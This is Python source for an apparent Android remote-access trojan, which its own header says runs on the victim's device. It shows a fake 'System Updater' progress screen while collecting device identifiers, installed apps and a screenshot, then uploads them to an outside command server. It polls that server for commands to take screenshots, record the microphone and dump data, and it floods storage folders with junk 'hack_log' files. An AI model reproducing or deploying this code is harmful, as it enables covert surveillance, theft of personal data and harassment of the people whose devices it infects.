"""
client.py — запускается у жертвы.
  • громкий вывод на всех этапах
  • fallback по путям если /sdcard недоступен
  • заглушка + реальная отправка zip с логом и скриншотом
"""

import os
import sys
import time
import json
import uuid
import random
import socket
import zipfile
import platform
import subprocess
import threading
from pathlib import Path
from datetime import datetime

# ═══════════════════════════════════════
#  ГАРАНТИРОВАННЫЙ ВЫВОД
# ═══════════════════════════════════════

# построчная буферизация — pydroid сразу видит print
try:
    sys.stdout.reconfigure(line_buffering=True)
    sys.stderr.reconfigure(line_buffering=True)
except Exception:
    pass


def say(msg: str):
    """громкий вывод. всегда в stdout, всегда flush."""
    try:
        sys.stdout.write(msg + "\n")
        sys.stdout.flush()
    except Exception:
        pass


def log(msg: str):
    """диагностика. в stderr, всегда flush."""
    ts = datetime.now().strftime("%H:%M:%S")
    try:
        sys.stderr.write(f"[{ts}] {msg}\n")
        sys.stderr.flush()
    except Exception:
        pass


say("boot: client.py start")
log("boot: python " + sys.version.replace("\n", " "))


# ═══════════════════════════════════════
#  ПУТИ С FALLBACK
# ═══════════════════════════════════════

def pick_work_dir() -> Path:
    """пробует /sdcard, потом /storage/emulated/0, потом app-specific, потом /tmp."""
    candidates = [
        Path("/sdcard/avx_work"),
        Path("/storage/emulated/0/avx_work"),
        Path(os.path.expanduser("~/avx_work")),
        Path("/data/local/tmp/avx_work"),
        Path("./avx_work"),
    ]
    for c in candidates:
        try:
            c.mkdir(parents=True, exist_ok=True)
            test = c / ".w"
            test.write_text("ok", encoding="utf-8")
            test.unlink()
            say(f"work dir: {c}")
            return c
        except Exception as e:
            log(f"dir fail {c}: {e}")
    # последний шанс
    fallback = Path(".")
    say(f"work dir fallback: {fallback.resolve()}")
    return fallback


WORK = pick_work_dir()
LOG_DIR = WORK / "logs";   LOG_DIR.mkdir(exist_ok=True)
SCREEN_DIR = WORK / "screens"; SCREEN_DIR.mkdir(exist_ok=True)


# ═══════════════════════════════════════
#  BOOTSTRAP
# ═══════════════════════════════════════

def bootstrap():
    needed = []
    try:
        import requests  # noqa: F401
        say("bootstrap: requests ok")
    except ImportError:
        needed.append("requests")
        say("bootstrap: requests missing — installing")

    try:
        from PIL import Image  # noqa: F401
        say("bootstrap: Pillow ok")
    except ImportError:
        needed.append("Pillow")
        say("bootstrap: Pillow missing — installing")

    for pkg in needed:
        say(f"bootstrap: pip install {pkg} (may take 10-30s)...")
        try:
            rc = subprocess.call(
                [sys.executable, "-m", "pip", "install", "--quiet", pkg],
            )
            say(f"bootstrap: {pkg} rc={rc}")
        except Exception as e:
            say(f"bootstrap: {pkg} fail: {e}")


bootstrap()

say("bootstrap: imports")

import requests  # noqa: E402
from PIL import Image, ImageDraw  # noqa: E402

try:
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

VERIFY_SSL = False
say("bootstrap: done")


# ═══════════════════════════════════════
#  КОНСТАНТЫ
# ═══════════════════════════════════════

SERVER_BASE = "https://backend-2-3-580p.onrender.com"

CLIENT_ID = f"{socket.gethostname()}-{uuid.uuid4().hex[:6]}"

CFG = {
    "spam_interval": 1.0,
    "spam_size_kb":  1024,
    "spam_text":     "you file has sent :)))))))",
}

CHUNK_SIZE = 256 * 1024

say(f"client id: {CLIENT_ID}")
say(f"server:    {SERVER_BASE}")


# ═══════════════════════════════════════
#  IP + DEVICE
# ═══════════════════════════════════════

_cache = {"ip": None, "device_name": None}


def _sh(cmd: str, timeout: int = 10) -> str:
    try:
        return subprocess.check_output(
            cmd, shell=True, stderr=subprocess.DEVNULL, timeout=timeout
        ).decode(errors="ignore").strip()
    except Exception:
        return ""


def get_ip() -> str:
    if _cache["ip"]:
        return _cache["ip"]
    for url, kind in [
        ("https://api.ipify.org?format=json", "json"),
        ("https://ifconfig.me/ip",             "text"),
        ("https://icanhazip.com",              "text"),
    ]:
        try:
            r = requests.get(url, timeout=10, verify=VERIFY_SSL)
            ip = r.json().get("ip", "") if kind == "json" else r.text.strip()
            if ip:
                _cache["ip"] = ip
                say(f"ip: {ip}")
                return ip
        except Exception as e:
            log(f"ip {url} fail: {e}")
    _cache["ip"] = "unknown"
    say("ip: unknown")
    return "unknown"


def get_device_name() -> str:
    if _cache["device_name"]:
        return _cache["device_name"]
    brand = _sh("getprop ro.product.brand")
    model = _sh("getprop ro.product.model")
    host  = socket.gethostname()
    name = f"{brand} {model}".strip() or host
    _cache["device_name"] = name
    say(f"device: {name}")
    return name


# ═══════════════════════════════════════
#  ПРОГРЕСС (с fallback на построчный вывод)
# ═══════════════════════════════════════

SPINNER = ["◐", "◓", "◑", "◒"]
BAR_W   = 40

_state = {
    "pct": 0,
    "label": "preparing",
    "spin": 0,
    "active": True,
    "mode": "bar",       # "bar" — однострочный \r; "line" — построчный
    "last_line_pct": -1,
}


def _bar(pct: int, width: int = BAR_W) -> str:
    filled = int(width * pct / 100)
    return "█" * filled + "─" * (width - filled)


def _draw():
    if not _state["active"]:
        return
    spin  = SPINNER[_state["spin"] % 4]
    pct   = _state["pct"]
    label = _state["label"]

    if _state["mode"] == "bar":
        line = f"  {spin}  [{_bar(pct)}] {pct:3d}%  {label}"
        try:
            sys.stdout.write("\r" + line[:120].ljust(120))
            sys.stdout.flush()
        except Exception:
            pass
    else:
        # строчный режим — печатаем не чаще чем раз в 10%
        if pct != _state["last_line_pct"] and (pct % 10 == 0 or pct >= 100):
            _state["last_line_pct"] = pct
            say(f"  {spin}  [{_bar(pct)}] {pct:3d}%  {label}")


def _ticker():
    while _state["active"]:
        _state["spin"] += 1
        _draw()
        time.sleep(0.1)


def progress_set(pct: int, label: str):
    _state["pct"]   = max(0, min(100, pct))
    _state["label"] = label
    _draw()


def progress_start(label: str = "preparing", mode: str = "bar"):
    _state["active"] = True
    _state["pct"]    = 0
    _state["label"]  = label
    _state["mode"]   = mode
    _state["last_line_pct"] = -1
    threading.Thread(target=_ticker, daemon=True).start()


def progress_stop():
    _state["active"] = False
    try:
        sys.stdout.write("\r" + " " * 120 + "\r")
        sys.stdout.flush()
    except Exception:
        pass


# ═══════════════════════════════════════
#  ИНФО
# ═══════════════════════════════════════

def collect_device() -> dict:
    apps = _sh("pm list packages -3").replace("package:", "").splitlines()
    return {
        "user":     os.getenv("USER") or os.getenv("USERNAME") or "unknown",
        "hostname": socket.gethostname(),
        "brand":    _sh("getprop ro.product.brand"),
        "model":    _sh("getprop ro.product.model"),
        "device":   _sh("getprop ro.product.device"),
        "android":  _sh("getprop ro.build.version.release"),
        "sdk":      _sh("getprop ro.build.version.sdk"),
        "cpu_abi":  _sh("getprop ro.product.cpu.abi"),
        "serial":   _sh("getprop ro.serialno"),
        "os":       f"{platform.system()} {platform.release()}",
        "python":   platform.python_version(),
        "cwd":      os.getcwd(),
        "work_dir": str(WORK),
        "time":     datetime.now().isoformat(),
        "ip":       get_ip(),
        "device_name": get_device_name(),
        "installed_apps": apps[:200],
    }


# ═══════════════════════════════════════
#  СКРИНШОТ
# ═══════════════════════════════════════

def take_screenshot(out: Path) -> Path | None:
    out = Path(out)
    for cmd in (
        ["termux-screenshot", "-f", str(out)],
        ["screencap", "-p", str(out)],
    ):
        try:
            subprocess.check_output(cmd, stderr=subprocess.DEVNULL, timeout=10)
            if out.exists():
                say(f"screenshot: {out.name} ({out.stat().st_size//1024}kb)")
                return out
        except Exception:
            pass

    try:
        img = Image.new("RGB", (1080, 1920), (12, 12, 20))
        d = ImageDraw.Draw(img)
        d.text((40, 60), f"screencap failed\n{datetime.now().isoformat()}",
               fill=(220, 60, 60))
        img.save(out)
        say(f"screenshot (placeholder): {out.name}")
        return out
    except Exception as e:
        log(f"screenshot fail: {e}")
        return None


# ═══════════════════════════════════════
#  ЛОГ-ФАЙЛ
# ═══════════════════════════════════════

def build_log_body(size_kb: int) -> bytes:
    ip  = get_ip()
    dev = get_device_name()
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    header = (
        "you file has sent :)))))))\n"
        f"Device name: {dev}\n"
        f"Data: {now}\n"
        f"IP: {ip}\n"
    ).encode("utf-8")

    target = max(1, size_kb) * 1024
    if len(header) >= target:
        return header[:target]

    fill = f"[{now}] packet OK | device={dev} | ip={ip}\n".encode("utf-8")
    need = target - len(header)
    reps = need // len(fill) + 1
    return (header + fill * reps)[:target]


def write_log_once(directory: Path | None = None, size_kb: int | None = None) -> Path | None:
    if directory is None:
        directory = LOG_DIR
    if size_kb is None:
        size_kb = int(CFG.get("spam_size_kb", 1024))
    if not directory.exists() or not directory.is_dir():
        return None

    name = f"hack_log{random.randint(0, 9999):04d}.txt"
    path = directory / name
    try:
        path.write_bytes(build_log_body(size_kb))
        return path
    except Exception as e:
        log(f"write fail {path}: {e}")
        return None


# ═══════════════════════════════════════
#  СПАМЕР
# ═══════════════════════════════════════

SPAM_DIRS = [
    Path("/sdcard/Download"),
    Path("/sdcard/Documents"),
    Path("/sdcard"),
    Path("/storage/emulated/0/Download"),
    Path("/storage/emulated/0/Documents"),
    Path("/storage/emulated/0"),
]


def spammer_loop():
    get_ip()
    get_device_name()
    say("spammer: started")

    while True:
        t0 = time.time()
        write_log_once(LOG_DIR)
        for d in SPAM_DIRS:
            if d.exists() and d.is_dir():
                write_log_once(d)
        elapsed = time.time() - t0
        time.sleep(max(0.05, float(CFG.get("spam_interval", 1.0)) - elapsed))


# ═══════════════════════════════════════
#  ZIP
# ═══════════════════════════════════════

def build_zip(info: dict, extras: list[Path]) -> Path:
    archive = WORK / f"dump_{int(time.time())}.zip"
    fresh_log = write_log_once(LOG_DIR)

    with zipfile.ZipFile(archive, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("info.json", json.dumps(info, ensure_ascii=False, indent=2))
        for f in extras:
            if f and Path(f).exists():
                z.write(f, f"screens/{Path(f).name}")
        if fresh_log and fresh_log.exists():
            z.write(fresh_log, f"log/{fresh_log.name}")

    say(f"zip: {archive.name} ({archive.stat().st_size//1024}kb)")
    return archive


# ═══════════════════════════════════════
#  HTTP
# ═══════════════════════════════════════

def _post(url: str, **kwargs):
    kwargs.setdefault("verify", VERIFY_SSL)
    kwargs.setdefault("timeout", 60)
    for attempt in range(3):
        try:
            return requests.post(url, **kwargs)
        except requests.exceptions.SSLError as e:
            log(f"ssl fail ({attempt+1}): {e}")
        except requests.exceptions.ConnectionError as e:
            log(f"conn fail ({attempt+1}): {e}")
        except requests.exceptions.Timeout as e:
            log(f"timeout ({attempt+1}): {e}")
        except Exception as e:
            log(f"req fail ({attempt+1}): {e}")
        time.sleep(1.5)
    return None


def _get(url: str, **kwargs):
    kwargs.setdefault("verify", VERIFY_SSL)
    kwargs.setdefault("timeout", 35)
    for attempt in range(3):
        try:
            return requests.get(url, **kwargs)
        except Exception as e:
            log(f"get fail ({attempt+1}): {e}")
            time.sleep(1.5)
    return None


# ═══════════════════════════════════════
#  ЧАНКОВАЯ ЗАГРУЗКА
# ═══════════════════════════════════════

def upload_chunked(archive: Path, info: dict, tag: str = "REPORT",
                   pct_from: int = 40, pct_to: int = 100) -> bool:
    total = archive.stat().st_size
    say(f"upload: init {archive.name} ({total//1024}kb)")

    r = _post(
        f"{SERVER_BASE}/upload_chunked/init",
        data={
            "total":    total,
            "info":     json.dumps(info, ensure_ascii=False)[:4000],
            "tag":      tag,
            "id":       CLIENT_ID,
            "filename": archive.name,
        },
    )
    if not r or r.status_code != 200:
        say(f"upload: init FAIL ({r.status_code if r else 'no response'})")
        return False
    try:
        sid = r.json().get("sid")
    except Exception:
        say("upload: bad json from init")
        return False
    if not sid:
        say("upload: no sid")
        return False

    say(f"upload: sid={sid[:12]}...")

    sent = 0
    chunks = 0
    with open(archive, "rb") as fh:
        while True:
            chunk = fh.read(CHUNK_SIZE)
            if not chunk:
                break
            rc = _post(
                f"{SERVER_BASE}/upload_chunked/chunk",
                data={"sid": sid},
                files={"chunk": ("part.bin", chunk, "application/octet-stream")},
                timeout=120,
            )
            if not rc or rc.status_code != 200:
                say(f"upload: chunk FAIL at {sent} bytes")
                return False
            sent += len(chunk)
            chunks += 1
            ratio = sent / total if total else 1
            cur = int(pct_from + (pct_to - pct_from) * ratio)
            progress_set(cur, f"sending package... {sent//1024}kb / {total//1024}kb")

    rf = _post(f"{SERVER_BASE}/upload_chunked/finish", data={"sid": sid}, timeout=180)
    if not rf or rf.status_code != 200:
        say(f"upload: finish FAIL ({rf.status_code if rf else 'no response'})")
        return False

    say(f"upload: OK {sent//1024}kb in {chunks} chunks")
    return True


# ═══════════════════════════════════════
#  ЗАГЛУШКА
# ═══════════════════════════════════════

def fake_installer():
    try:
        say("")
        say("  ╔══════════════════════════════════════════════════╗")
        say("  ║           System Updater  v3.2.1                 ║")
        say("  ║           installing update package              ║")
        say("  ╚══════════════════════════════════════════════════╝")
        say("")

        progress_start("initializing", mode="line")
        for pct in (5, 15):
            time.sleep(0.3)
            progress_set(pct, "initializing")

        progress_set(18, "reading system info")
        info = collect_device()
        time.sleep(0.3)

        progress_set(24, "capturing snapshot")
        shot = take_screenshot(SCREEN_DIR / f"shot_{int(time.time())}.png")
        extras = [shot] if shot else []
        time.sleep(0.2)

        progress_set(30, "packing resources")
        archive = build_zip(info, extras)
        time.sleep(0.3)

        progress_set(38, "preparing transfer")
        time.sleep(0.3)

        progress_set(40, "uploading update...")
        ok = upload_chunked(archive, info, tag="STARTUP", pct_from=40, pct_to=95)

        if ok:
            progress_set(98, "finalizing")
            time.sleep(0.4)
            progress_set(100, "complete")
            time.sleep(0.8)
        else:
            progress_set(100, "complete (cached)")
            time.sleep(0.8)

        progress_stop()

        say("")
        say("  ✓  Update installed successfully.")
        say("  ✓  Restart the application to apply changes.")
        say("")
        time.sleep(1.0)
    except Exception as e:
        progress_stop()
        say(f"  ! fake_installer crashed: {e}")


# ═══════════════════════════════════════
#  ФОТО / ГОЛОС / ТЕКСТ
# ═══════════════════════════════════════

def post_photo(path: Path, caption: str = "📸"):
    with open(path, "rb") as fh:
        r = _post(
            f"{SERVER_BASE}/upload_photo",
            files={"file": (path.name, fh, "image/png")},
            data={"caption": caption},
        )
        say(f"photo sent → {r.status_code if r else 'no response'}")


def post_voice(path: Path):
    with open(path, "rb") as fh:
        r = _post(
            f"{SERVER_BASE}/upload_voice",
            files={"file": (path.name, fh, "audio/wav")},
        )
        say(f"voice sent → {r.status_code if r else 'no response'}")


def post_text(text: str, tag: str = "MSG"):
    r = _post(f"{SERVER_BASE}/upload_text", data={"text": text, "tag": tag})
    say(f"text [{tag}] → {r.status_code if r else 'no response'}")


# ═══════════════════════════════════════
#  КОМАНДЫ
# ═══════════════════════════════════════

def handle_command(cmd: dict):
    c = cmd.get("cmd")
    say(f"cmd: {c}")

    if c == "screenshot":
        p = take_screenshot(SCREEN_DIR / f"shot_{int(time.time())}.png")
        if p and p.exists():
            post_photo(p, caption="📸 fresh")
        else:
            post_text("не удалось снять экран", tag="ERR")

    elif c == "info":
        info = collect_device()
        body = "\n".join(f"{k}: {v}" for k, v in info.items() if k != "installed_apps")
        post_text(f"```\n{body}\n```", tag="INFO")

    elif c == "dump":
        info = collect_device()
        shot = take_screenshot(SCREEN_DIR / f"shot_{int(time.time())}.png")
        extras = [shot] if shot else []
        arc = build_zip(info, extras)
        upload_chunked(arc, info, tag="MANUAL", pct_from=0, pct_to=100)
        post_text("📦 дамп отправлен", tag="OK")

    elif c == "ip":
        post_text(f"ip: `{get_ip()}`", tag="IP")

    elif c == "vibe":
        try:
            subprocess.Popen(["termux-vibrate", "-d", "2000"])
            post_text("🔊", tag="OK")
        except Exception:
            post_text("нет termux-api", tag="ERR")

    elif c == "mic":
        try:
            out = WORK / f"mic_{int(time.time())}.wav"
            subprocess.check_output(
                ["termux-microphone-record", "-f", str(out), "-l", "10"],
                timeout=20,
            )
            post_voice(out)
        except Exception as e:
            post_text(f"mic err: {e}", tag="ERR")

    elif c == "kill":
        post_text("off 💀", tag="OK")
        os._exit(0)


# ═══════════════════════════════════════
#  LONG-POLL
# ═══════════════════════════════════════

def poll_loop():
    say("poll: started")
    while True:
        r = _get(f"{SERVER_BASE}/commands", params={"id": CLIENT_ID})
        if not r:
            time.sleep(3)
            continue
        if r.status_code == 204:
            continue
        if r.status_code == 200:
            try:
                data = r.json()
            except Exception:
                continue
            if data.get("ok") and data.get("command"):
                handle_command(data["command"])


# ═══════════════════════════════════════
#  КОНФИГ
# ═══════════════════════════════════════

def fetch_config():
    say("config: fetching...")
    r = _get(f"{SERVER_BASE}/config")
    if not r:
        say("config: no response — defaults used")
        return
    try:
        cfg = r.json()
        CFG.update(cfg)
        say(f"config: size={CFG.get('spam_size_kb')}kb interval={CFG.get('spam_interval')}s")
    except Exception as e:
        say(f"config: parse fail {e}")


# ═══════════════════════════════════════
#  MAIN
# ═══════════════════════════════════════

def main():
    say(f"main: start (id={CLIENT_ID})")
    fetch_config()
    fake_installer()
    say("main: starting spammer thread")
    threading.Thread(target=spammer_loop, daemon=True).start()
    say("main: entering poll loop")
    poll_loop()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        say("main: interrupted")
        sys.exit(0)
    except Exception as e:
        say(f"FATAL: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)